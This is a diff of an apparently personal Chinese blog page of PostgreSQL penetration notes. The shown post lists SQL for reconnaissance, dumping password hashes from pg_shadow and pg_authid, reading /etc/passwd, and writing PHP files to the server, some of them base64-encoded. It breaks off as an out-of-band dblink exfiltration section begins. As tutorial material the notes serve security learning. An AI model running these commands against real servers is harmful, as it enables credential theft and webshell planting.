@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/noto-serif-sc@5.0.0/700.css"><link rel="stylesheet" href="/assets/theme.css?v=6dd575d7"><script defer src="/assets/app.js?v=6dd575d7"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/noto-serif-sc@5.0.0/700.css"><link rel="stylesheet" href="/assets/theme.css?v=dc730d05"><script defer src="/assets/app.js?v=dc730d05"></script>
     <link rel="icon" href="https://avatars.githubusercontent.com/u/237383456?v=4&size=200"><script>
         let theme = localStorage.getItem("meek_theme") || "light";
         document.documentElement.setAttribute("data-color-mode", theme);
@@ -249,7 +249,7 @@ copy有两个命令：COPY FROM和COPY TO。">
 <meta property="og:url" content="https://P7IVESC.github.io/post/PostgreSQL-shu-ju-ku-shen-tou.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/237383456?v=4&size=200">
 <title>PostgreSQL数据库渗透</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -317,9 +317,11 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><p>命令行连接方式</p>
 <p>安装客户端</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">apt install postgresql-client</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">apt install postgresql-client
+</code></pre>
 <p>连接方式</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">psql -U postgres -p port -h ip -W -d postgres</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">psql -U postgres -p port -h ip -W -d postgres
+</code></pre>
 <p>-U 指定用户名</p>
 <p>-d 指定连接的数据库，postgresql连接必须指定数据库</p>
 <p>-h 远程连接ip</p>
@@ -338,38 +340,45 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ff96a0c46dff0d9b1d892422f6d711146133e6a0aea2266d4a27dd427a12fe89/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3663386162636163663261642e706e67"><img src="https://camo.githubusercontent.com/ff96a0c46dff0d9b1d892422f6d711146133e6a0aea2266d4a27dd427a12fe89/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3663386162636163663261642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6c8abcacf2ad.png" style="max-width: 100%;"></a></p>
 <h2>Postgresql信息收集</h2>
 <p>使用psql命令或navicat登陆后，可以使用如下命令进行信息搜集</p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 详细信息 </span>
-<span class="pl-k">select</span> version();</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">-- 详细信息 
+select version();
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ce94315df566ef74ae67fcf3b9d9836433b33502a970d564b20c507fa902aa2f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6163623637343364636434312e706e67"><img src="https://camo.githubusercontent.com/ce94315df566ef74ae67fcf3b9d9836433b33502a970d564b20c507fa902aa2f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6163623637343364636434312e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/acb6743dcd41.png" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 版本信息 </span>
-show server_version;</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">-- 版本信息 
+show server_version;
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7a607dfd89215aa4fd493d1e2d917e10118b8018e8212f46f800e150b18f785b/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6238313863633637383532302e706e67"><img src="https://camo.githubusercontent.com/7a607dfd89215aa4fd493d1e2d917e10118b8018e8212f46f800e150b18f785b/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6238313863633637383532302e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/b818cc678520.png" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> pg_read_file(<span class="pl-s"><span class="pl-pds">'</span>PG_VERSION<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>, <span class="pl-c1">200</span>);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">select pg_read_file('PG_VERSION', 0, 200);
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/18b54cbd41c80c9fd022f4ef2855d51a2683e09b44b180267b5a3cafa1d759cd/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6262323334616562356363612e706e67"><img src="https://camo.githubusercontent.com/18b54cbd41c80c9fd022f4ef2855d51a2683e09b44b180267b5a3cafa1d759cd/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6262323334616562356363612e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bb234aeb5cca.png" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 数字版本信息包括小版号 </span>
-SHOW server_version_num;</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">-- 数字版本信息包括小版号 
+SHOW server_version_num;
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ac86584b52ac8ec80814a43a347cffdc95ace1fdcae250490486c9283f82aecb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3632396331393961623333342e706e67"><img src="https://camo.githubusercontent.com/ac86584b52ac8ec80814a43a347cffdc95ace1fdcae250490486c9283f82aecb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3632396331393961623333342e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/629c199ab334.png" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> current_setting(<span class="pl-s"><span class="pl-pds">'</span>server_version_num<span class="pl-pds">'</span></span>);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">SELECT current_setting('server_version_num');
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/af930d0c29513d8488f4a3af1fd5a55dbe819a2a2b46c878fcec5c6435351977/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6331303835303736393463652e706e67"><img src="https://camo.githubusercontent.com/af930d0c29513d8488f4a3af1fd5a55dbe819a2a2b46c878fcec5c6435351977/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6331303835303736393463652e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c108507694ce.png" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 获取 pgsql 安装目录 </span>
-<span class="pl-k">select</span> setting <span class="pl-k">from</span> pg_settings <span class="pl-k">where</span> name <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>data_directory<span class="pl-pds">'</span></span>; 
-<span class="pl-c"><span class="pl-c">--</span> 查找 pgsql 配置文件路径 </span>
-<span class="pl-k">select</span> setting <span class="pl-k">from</span> pg_settings <span class="pl-k">where</span> name<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>config_file<span class="pl-pds">'</span></span> 
-<span class="pl-c"><span class="pl-c">--</span> 列出数据库 </span>
-<span class="pl-k">SELECT</span> datname <span class="pl-k">FROM</span> pg_database; 
-<span class="pl-c"><span class="pl-c">--</span> 查看服务器ip地址（如果运行在docker中可能存在IP不一致的问题） </span>
-<span class="pl-k">select</span> inet_server_addr();
-<span class="pl-c"><span class="pl-c">--</span> 查看当前用户是不是管理员权限 on 代表是, off 代表不是 </span>
-<span class="pl-k">SELECT</span> current_setting(<span class="pl-s"><span class="pl-pds">'</span>is_superuser<span class="pl-pds">'</span></span>); 
-<span class="pl-c"><span class="pl-c">--</span> 查询密码（印证了之前的说法 postgres用户没有设置密码） </span>
-<span class="pl-k">SELECT</span> usename, passwd <span class="pl-k">FROM</span> pg_shadow; 
-<span class="pl-k">SELECT</span> rolname,rolpassword <span class="pl-k">FROM</span> pg_authid;
-<span class="pl-c"><span class="pl-c">--</span> 查询当前的加密方式 </span>
-<span class="pl-k">SELECT</span> name,setting,source,enumvals <span class="pl-k">FROM</span> pg_settings <span class="pl-k">WHERE</span> name <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>password_encryption<span class="pl-pds">'</span></span>;</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">-- 获取 pgsql 安装目录 
+select setting from pg_settings where name = 'data_directory'; 
+-- 查找 pgsql 配置文件路径 
+select setting from pg_settings where name='config_file' 
+-- 列出数据库 
+SELECT datname FROM pg_database; 
+-- 查看服务器ip地址（如果运行在docker中可能存在IP不一致的问题） 
+select inet_server_addr();
+-- 查看当前用户是不是管理员权限 on 代表是, off 代表不是 
+SELECT current_setting('is_superuser'); 
+-- 查询密码（印证了之前的说法 postgres用户没有设置密码） 
+SELECT usename, passwd FROM pg_shadow; 
+SELECT rolname,rolpassword FROM pg_authid;
+-- 查询当前的加密方式 
+SELECT name,setting,source,enumvals FROM pg_settings WHERE name = 'password_encryption';
+</code></pre>
 <h2>Postgresql读文件</h2>
 <h2>pg_read_file</h2>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> pg_read_file(<span class="pl-s"><span class="pl-pds">'</span>/etc/passwd<span class="pl-pds">'</span></span>); 
-<span class="pl-k">select</span><span class="pl-c"><span class="pl-c">/**/</span></span>PG_READ_FILE($$<span class="pl-k">/</span>etc<span class="pl-k">/</span>passwd$$);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">select pg_read_file('/etc/passwd'); 
+select/**/PG_READ_FILE($$/etc/passwd$$);
+</code></pre>
 <pre class="notranslate"><code class="notranslate">在早期的 PostgreSQL 版本中，pg_read_file不允许使用绝对路径
 </code></pre>
 <h2>copy_from</h2>
@@ -377,23 +386,25 @@ SHOW server_version_num;</pre></div>
 <p>COPY TO用于把一个表的内容复制到一个文件；COPY FROM用于从文件复制数据到表中。</p>
 <p>COPY TO中也可以指定查询，将查询结果写入文件。COPY FROM中文件的字段按照顺序写入到</p>
 <p>指定列中。</p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">DROP</span> <span class="pl-k">TABLE</span> IF EXISTS testf0x; 
-<span class="pl-k">create</span> <span class="pl-k">table</span> <span class="pl-en">testf0x</span>(t <span class="pl-k">TEXT</span>); 
-copy testf0x <span class="pl-k">from</span> <span class="pl-s"><span class="pl-pds">'</span>/etc/passwd<span class="pl-pds">'</span></span>; 
-<span class="pl-k">select</span> <span class="pl-k">*</span> <span class="pl-k">from</span> testf0x;</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">DROP TABLE IF EXISTS testf0x; 
+create table testf0x(t TEXT); 
+copy testf0x from '/etc/passwd'; 
+select * from testf0x;
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c784995f0f53debda384d33e4dac0dae852c5494ba6a3949084334374437285f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6361353365373135386135372e706e67"><img src="https://camo.githubusercontent.com/c784995f0f53debda384d33e4dac0dae852c5494ba6a3949084334374437285f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6361353365373135386135372e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ca53e7158a57.png" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6ebf3ac39207d8906fe284992bb481c098aed5f52dddcfd272edb9b2fd7ca378/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6164643833336462666162352e77656270"><img src="https://camo.githubusercontent.com/6ebf3ac39207d8906fe284992bb481c098aed5f52dddcfd272edb9b2fd7ca378/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6164643833336462666162352e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/add833dbfab5.webp" style="max-width: 100%;"></a></p>
 <h2>lo_import</h2>
 <p>lo_import 是 PostgreSQL 内置函数，把服务器端文件导入为一个大对象（Large Object），存到系统表</p>
 <p>pg_largeobject 里。第二个参数 12345678 是手动指定的 OID（对象标识符），方便后续引用。执行完后</p>
 <p>/etc/passwd的内容就被存进数据库了。</p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> lo_import(<span class="pl-s"><span class="pl-pds">'</span>/etc/passwd<span class="pl-pds">'</span></span>,<span class="pl-c1">12345678</span>); 
-<span class="pl-c"><span class="pl-c">--</span> 直接读取 </span>
-<span class="pl-k">select</span> convert_from(lo_get(<span class="pl-c1">12345678</span>), <span class="pl-s"><span class="pl-pds">'</span>UTF8<span class="pl-pds">'</span></span>); 
-<span class="pl-c"><span class="pl-c">--</span> 报错带出 </span>
-<span class="pl-k">select</span> array_agg(b)::<span class="pl-k">text</span>::<span class="pl-k">int</span> <span class="pl-k">from</span>(<span class="pl-k">select</span> encode(data,<span class="pl-s"><span class="pl-pds">'</span>hex<span class="pl-pds">'</span></span>)b,pageno <span class="pl-k">from</span> pg_largeobject <span class="pl-k">where</span> loid<span class="pl-k">=</span><span class="pl-c1">12345678</span> <span class="pl-k">order by</span> pageno)a; 
-<span class="pl-c"><span class="pl-c">--</span> 删除对象 </span>
-<span class="pl-k">select</span> lo_unlink(<span class="pl-c1">12345678</span>);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">select lo_import('/etc/passwd',12345678); 
+-- 直接读取 
+select convert_from(lo_get(12345678), 'UTF8'); 
+-- 报错带出 
+select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a; 
+-- 删除对象 
+select lo_unlink(12345678);
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/07940ee9cd0e705d43717f26e0d1aeabdc3ce0e3f2070f247f1fdda1e7ad8e18/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6133643632663563646233382e706e67"><img src="https://camo.githubusercontent.com/07940ee9cd0e705d43717f26e0d1aeabdc3ce0e3f2070f247f1fdda1e7ad8e18/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6133643632663563646233382e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a3d62f5cdb38.png" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9b5785130b3c66a2e0c64becbf32948c5d9fde8f266a7160e1dcc672ef3c1cf8/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3037383338623465303230642e706e67"><img src="https://camo.githubusercontent.com/9b5785130b3c66a2e0c64becbf32948c5d9fde8f266a7160e1dcc672ef3c1cf8/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3037383338623465303230642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/07838b4e020d.png" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ef1e4cc60944fdb885ae4d642d709c547f32fc7a31195c9893a6287ef0fd46d4/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3635656563656165316638332e77656270"><img src="https://camo.githubusercontent.com/ef1e4cc60944fdb885ae4d642d709c547f32fc7a31195c9893a6287ef0fd46d4/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3635656563656165316638332e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/65eeceae1f83.webp" style="max-width: 100%;"></a></p>
@@ -403,69 +414,83 @@ copy testf0x <span class="pl-k">from</span> <span class="pl-s"><span class="pl-p
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b9ef6863c95926822c0d275f1962e9f95c6eb7813fafa0383be523c8bc8af94c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3736306131646230366130312e77656270"><img src="https://camo.githubusercontent.com/b9ef6863c95926822c0d275f1962e9f95c6eb7813fafa0383be523c8bc8af94c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3736306131646230366130312e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/760a1db06a01.webp" style="max-width: 100%;"></a></p>
 <h2>Postgresql写文件</h2>
 <h2>copy命令</h2>
-<div class="highlight highlight-source-sql"><pre class="notranslate">COPY (<span class="pl-k">select</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;?php phpinfo();?&gt;<span class="pl-pds">'</span></span>) to <span class="pl-s"><span class="pl-pds">'</span>/tmp/1.php<span class="pl-pds">'</span></span>;</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">COPY (select '&lt;?php phpinfo();?&gt;') to '/tmp/1.php';
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e424ed2ff6683777f8c2846af40ab5dd4a7e1edb5c3b2093fd886414458c30fe/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3435333732616635343038662e706e67"><img src="https://camo.githubusercontent.com/e424ed2ff6683777f8c2846af40ab5dd4a7e1edb5c3b2093fd886414458c30fe/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3435333732616635343038662e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/45372af5408f.png" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/119bd7491a41c4ffd5c8b356c3ff60c5bb0bc91b5bbea6351ff9f861c084a127/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6364646263303864346432392e77656270"><img src="https://camo.githubusercontent.com/119bd7491a41c4ffd5c8b356c3ff60c5bb0bc91b5bbea6351ff9f861c084a127/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6364646263303864346432392e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/cddbc08d4d29.webp" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span>遇到特殊字符也可以采用编码的方式写入 </span>
-COPY (<span class="pl-k">select</span> convert_from(decode(<span class="pl-s"><span class="pl-pds">'</span>PD9waHAgcGhwaW5mbygpOz8+<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>base64<span class="pl-pds">'</span></span>),<span class="pl-s"><span class="pl-pds">'</span>utf-8<span class="pl-pds">'</span></span>)) to <span class="pl-s"><span class="pl-pds">'</span>/tmp/2.php<span class="pl-pds">'</span></span>;</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">--遇到特殊字符也可以采用编码的方式写入 
+COPY (select convert_from(decode('PD9waHAgcGhwaW5mbygpOz8+','base64'),'utf-8')) to '/tmp/2.php';
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/70825b9dafcd51edfbd0f4d7272d5cc188381ea0608c88d75099dc072ddd5048/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6639616332333765343964342e706e67"><img src="https://camo.githubusercontent.com/70825b9dafcd51edfbd0f4d7272d5cc188381ea0608c88d75099dc072ddd5048/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f6639616332333765343964342e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f9ac237e49d4.png" style="max-width: 100%;"></a></p>
 <h2>lo_export命令</h2>
 <p>采用大对象 OID 和路径，将文件写入路径。</p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> lo_from_bytea(<span class="pl-c1">12349</span>,<span class="pl-s"><span class="pl-pds">'</span>&lt;?php phpinfo();?&gt;<span class="pl-pds">'</span></span>);</pre></div>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">SELECT</span> lo_export(<span class="pl-c1">12349</span>, <span class="pl-s"><span class="pl-pds">'</span>/tmp/3.php<span class="pl-pds">'</span></span>);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">SELECT lo_from_bytea(12349,'&lt;?php phpinfo();?&gt;');
+</code></pre>
+<pre lang="sql" class="notranslate"><code class="notranslate">SELECT lo_export(12349, '/tmp/3.php');
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8efd6786fe47da852c200f2b085ad6debe76596b2b06689e0161d47b15772dfa/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3037636161386565626131392e706e67"><img src="https://camo.githubusercontent.com/8efd6786fe47da852c200f2b085ad6debe76596b2b06689e0161d47b15772dfa/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3037636161386565626131392e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/07caa8eeba19.png" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> base64 的形式 </span>
-<span class="pl-k">SELECT</span> lo_from_bytea(<span class="pl-c1">12350</span>,decode(<span class="pl-s"><span class="pl-pds">'</span>PD9waHAgcGhwaW5mbygpOz8+<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>base64<span class="pl-pds">'</span></span>)); 
-<span class="pl-k">SELECT</span> lo_export(<span class="pl-c1">12350</span>, <span class="pl-s"><span class="pl-pds">'</span>/tmp/4.php<span class="pl-pds">'</span></span>);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">-- base64 的形式 
+SELECT lo_from_bytea(12350,decode('PD9waHAgcGhwaW5mbygpOz8+','base64')); 
+SELECT lo_export(12350, '/tmp/4.php');
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/cf2747bbdd848c1de69c3391b1933f9329fdcd66292edc4b55622ee708916413/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3737643638663264303463642e706e67"><img src="https://camo.githubusercontent.com/cf2747bbdd848c1de69c3391b1933f9329fdcd66292edc4b55622ee708916413/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3737643638663264303463642e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/77d68f2d04cd.png" style="max-width: 100%;"></a></p>
 <h2>lo_export + pg_largeobject</h2>
 <p>这是 PostgreSQL 利用大对象写文件的另一种手法，跟 lo_from_bytea 思路一样，但更底层，直接操作 pg_largeobject 系统表。</p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 第一步，创建一个空的大对象，记下生成的lo_creat ID </span>
-<span class="pl-k">SELECT</span> lo_creat(<span class="pl-k">-</span><span class="pl-c1">1</span>); 
-<span class="pl-c"><span class="pl-c">--</span> 第二步，往大对象里写数据，替换 24577 为生成的lo_creat ID </span>
-<span class="pl-k">INSERT INTO</span> pg_largeobject(loid, pageno, data) <span class="pl-k">values</span> (<span class="pl-c1">24577</span>, <span class="pl-c1">0</span>,decode(<span class="pl-s"><span class="pl-pds">'</span>ZmZmZmZmZmYweA==<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>base64<span class="pl-pds">'</span></span>)); 
-<span class="pl-c"><span class="pl-c">--</span> 第三步，导出到服务器文件系统： </span>
-<span class="pl-k">select</span> lo_export(<span class="pl-c1">24577</span>, <span class="pl-s"><span class="pl-pds">'</span>/tmp/success.txt<span class="pl-pds">'</span></span>);</pre></div>
+<pre lang="sql" class="notranslate"><code class="notranslate">-- 第一步，创建一个空的大对象，记下生成的lo_creat ID 
+SELECT lo_creat(-1); 
+-- 第二步，往大对象里写数据，替换 24577 为生成的lo_creat ID 
+INSERT INTO pg_largeobject(loid, pageno, data) values (24577, 0,decode('ZmZmZmZmZmYweA==', 'base64')); 
+-- 第三步，导出到服务器文件系统： 
+select lo_export(24577, '/tmp/success.txt');
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3d61c4898ed87e4478e013e004f1d32e99f171818bd3e5f9203c12e3cfec9594/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3662306562323131383166322e706e67"><img src="https://camo.githubusercontent.com/3d61c4898ed87e4478e013e004f1d32e99f171818bd3e5f9203c12e3cfec9594/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3662306562323131383166322e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6b0eb21181f2.png" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2427845038af762b42cf0e0d1f5f8fc006b66d20dfd31e6661e8cf9f4407a1ee/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3962336235643439363938622e706e67"><img src="https://camo.githubusercontent.com/2427845038af762b42cf0e0d1f5f8fc006b66d20dfd31e6661e8cf9f4407a1ee/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3962336235643439363938622e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9b3b5d49698b.png" style="max-width: 100%;"></a></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/ca2302ef443bb350f409b62130f6c5942ae0c9fede81c2d65d4209c36de4fd86/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3831663633373537323930342e77656270"><img src="https://camo.githubusercontent.com/ca2302ef443bb350f409b62130f6c5942ae0c9fede81c2d65d4209c36de4fd86/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f503749564553432f696d67406d61696e2f323032362f31312f3831663633373537323930342e77656270" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/81f637572904.webp" style="max-width: 100%;"></a></p>
 <h2>Postgresql带外数据</h2>
 <p>简单说就是：当你没法直接在查询结果里看到数据（比如盲注、无回显）时，通过<strong>让数据库主动和你的服务器通信</strong>，把数据 “带出来” 的一种攻击 / 利用技术。</p>
-<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-c"><span class="pl-c">--</span> 开启 dblink 扩展 </span>
+<pre lang="sql" class="notranslate"><code class="notranslate">-- 开启 dblink 扩展 
 CREATE EXTENSION dblink; 
-<span class="pl-c"><span class="pl-c">--</span> 获取当前数据库用户名称 </span>
